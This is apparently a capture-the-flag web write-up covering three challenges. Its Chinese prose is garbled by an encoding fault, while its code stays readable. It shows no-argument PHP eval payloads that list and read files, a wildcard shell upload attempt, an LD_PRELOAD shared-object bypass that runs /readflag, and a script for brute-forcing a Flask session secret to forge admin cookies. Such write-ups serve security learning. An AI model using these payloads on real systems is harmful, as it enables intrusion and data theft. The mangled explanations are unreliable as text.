# Puppy_rce

å®¡è®¡ä¸€ä¸‹ä»£ç ï¼Œå…¸å‹çš„æ— å‚rce

```php
<?php
highlight_file(__FILE__);
header('Content-Type: text/html; charset=utf-8');
error_reporting(0);
include(flag.php);
//å½“å‰ç›®å½•ä¸‹æœ‰å¥½åº·çš„ğŸ˜‹
if (isset($_GET['var']) && $_GET['var']) {
    $var = $_GET['var'];
   
    if (!preg_match("/env|var|session|header/i", $var,$match)) {
        if (';' === preg_replace('/[^\s\(\)]+?\((?R)?\)/', '', $var)){
        eval($_GET['var']);
        }
        else die("WAF!!");
    } else{
        die("PLZ DONT HCAK MEğŸ˜…");
    }
} 
```

ç”±äºè¿‡æ»¤äº†`env`,`var`,`session`,`header`ï¼Œå› æ­¤å¯ä»¥ç”¨scandiræ¥æŸ¥çœ‹å½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶

```
?var=print_r(scandir(current(localeconv())));
```

![image-20231112183051787](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20231112183051787.png)

å‘ç°flagå®é™…ä¸Šåœ¨fl@g.phpé‡Œé¢

ä½†æ˜¯ä½ ä¼šå‘ç°ä½ ç”¨`array_reverse`æŠŠæ•°ç»„ç¿»è½¬åè¯»å–å¹¶ä¸å¯è¡Œï¼Œå› ä¸ºfl@g.phpæ˜¯åœ¨ä¸­é—´çš„

è¿™æ—¶å€™å°±å¾—ç”¨åˆ°è¿™ä¸‹é¢ä¿©å‡½æ•°äº†

```
array_flip():äº¤æ¢æ•°ç»„ä¸­çš„é”®å’Œå€¼
array_rand():ä»æ•°ç»„ä¸­éšæœºå–å‡ºä¸€ä¸ªæˆ–å¤šä¸ªå•å…ƒ
```

ç¬¬ä¸€ä¸ªå‡½æ•°å°±ç›¸å½“äºæŠŠæ•°ç»„çš„ä¸‹æ ‡å’Œæ•°ç»„çš„å†…å®¹åšäº¤æ¢

ç¬¬äºŒä¸ªå‡½æ•°å°±ç›¸å½“äºéšæœºé€‰ä¸€ä¸ªæ•°ç»„ï¼ŒæŠŠæ•°ç»„çš„ä¸‹æ ‡çš„å†…å®¹ç»™æ˜¾ç¤ºå‡ºæ¥ï¼ˆåº”è¯¥æ˜¯å†…å®¹ä¸­çš„å†…å®¹ï¼Œå› ä¸ºç°åœ¨çš„å†…å®¹æ˜¯ä¸ªæ–‡ä»¶....ï¼‰

äºæ˜¯ä¹å°±å¯ä»¥è¿™æ ·æ„é€ 

```
?var=show_source(array_rand(array_flip(scandir(current(localeconv())))));
```

åˆ·æ–°å‡ æ¬¡å°±å¥½

![image-20231112183915233](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20231112183915233.png)

# ezrce

æ— æ•°å­—æ— å¤§éƒ¨åˆ†å­—æ¯æ— {}rce

å¼€å§‹å†™çš„è„šæœ¬æ˜¯è¿™æ ·çš„

```php
import requests

url = "https://zcupqouc3075ow6ar71c0ng70.node.game.sycsec.com/?data=?><?=`. /???/????????[@-[]`;?>"
files = {'files':"systyem('print(1+1);')"}
res = requests.post(url=url,files=files).text
with open('b.txt','w') as f:
    f.write(res)
    print(res)
```

æ–‡ä»¶ä¸Šä¼ ç»•è¿‡wafï¼Œåˆç†å¯¹å§ã€‚ä½†ä¼¼ä¹ä¸è¡Œæï¼Œä»€ä¹ˆè¿”å›éƒ½æ²¡æœ‰

å…ˆè¯•è¯•19å¹´çš„rce meï¼Œçœ‹çœ‹æ€ä¹ˆç”¨LD_ORELOAD

## rce me

```php
<?php
error_reporting(0);
if(isset($_GET['code'])){
            $code=$_GET['code'];
                    if(strlen($code)>40){
                                        die("This is too Long.");
                                                }
                    if(preg_match("/[A-Za-z0-9]+/",$code)){
                                        die("NO.");
                                                }
                    @eval($code);
}
else{
            highlight_file(__FILE__);
}

?>
```

æ— å­—æ¯æ•°å­—rceï¼Œç”¨å–åå¼‚æˆ–ä»€ä¹ˆçš„éƒ½è¡Œï¼Œè¿™é‡Œå°±è·Ÿç€wpèµ°ä¸€éï¼Œç”¨å–å

![image-20231121114342912](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20231121114342912.png)

![image-20231121114354170](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20231121114354170.png)

æˆåŠŸæ‰§è¡Œï¼Œç”¨èšå‰‘è¿ä¸€ä¸‹

ç”±äºé‡Œé¢æ˜¯ç©ºçš„ï¼Œæ‰€ä»¥å¯ä»¥è€ƒè™‘ç”¨LD_PRELOADç»•è¿‡

```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
void payload() {
	system("/readflag >> /var/tmp/test.php");
}   
int  geteuid() {
    if (getenv("LD_PRELOAD") == NULL) { return 0; }
    unsetenv("LD_PRELOAD");
    payload();
}
```

```php
<?php
putenv("LD_PRELOAD=/var/tmp/getflag.so");
mail("","","","");
error_log("",1,"","");
?>
```



# you konw flask?

ä¸€çœ¼ä¼ªé€ flask

å…ˆç®—å˜æ³¨å†Œä¸€ä¸ªè´¦å·çœ‹çœ‹ï¼Œç„¶åæŠŠå¾—åˆ°çš„sessionè§£å¯†ä¸€ä¸‹

![image-20231120184059236](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20231120184059236.png)

çŒœæµ‹æ˜¯è¦è®©is_adminå˜ä¸ºTrueæ‰èƒ½æ‹¿åˆ°flag

å†…å®¹çŸ¥é“äº†ï¼Œä½†æ˜¯SECRET_KEYåœ¨å“ªï¼Ÿ

dirsearchæ‰«ä¸€ä¸‹ï¼Œå‘ç°æœ‰robots.txt

![image-20231120184208154](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20231120184208154.png)

è¿›å»åè·³è½¬ç»™çš„ç½‘é¡µçœ‹çœ‹ï¼Œæºä»£ç æç¤ºå¦‚å›¾

![image-20231120184251970](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20231120184251970.png)

ä¸­é—´æ˜¯1-100çš„éšæœºå­—ç¬¦base64åŠ å¯†åçš„å­—ç¬¦ä¸²ï¼Œå†™ä¸ªè„šæœ¬å¾—åˆ°å¯†ç æœ¬

```python
import base64
import random

for i in range(1,300):
    str2 = 'wanbao' + base64.b64encode(str(random.randint(1,100)).encode('utf-8')).decode("utf-8") + 'wanbao'
    with open('b.txt','a') as file:
        file.writelines(str2+'\n')
```

forå¾ªç¯èŒƒå›´è‡ªå®šï¼Œåªè¦å¾—å‡ºkeyå°±è¡Œ

![image-20231120184411694](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20231120184411694.png)

å¾—åˆ°keyä¸ºwanbaoNjE=wanbao

é‚£å†å»åŠ å¯†ä¸€ä¸‹

![image-20231120184653844](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20231120184653844.png)

æˆåŠŸå½“æˆæ•™ç»ƒ

![image-20231120184753410](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20231120184753410.png)

![image-20231120184812074](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20231120184812074.png)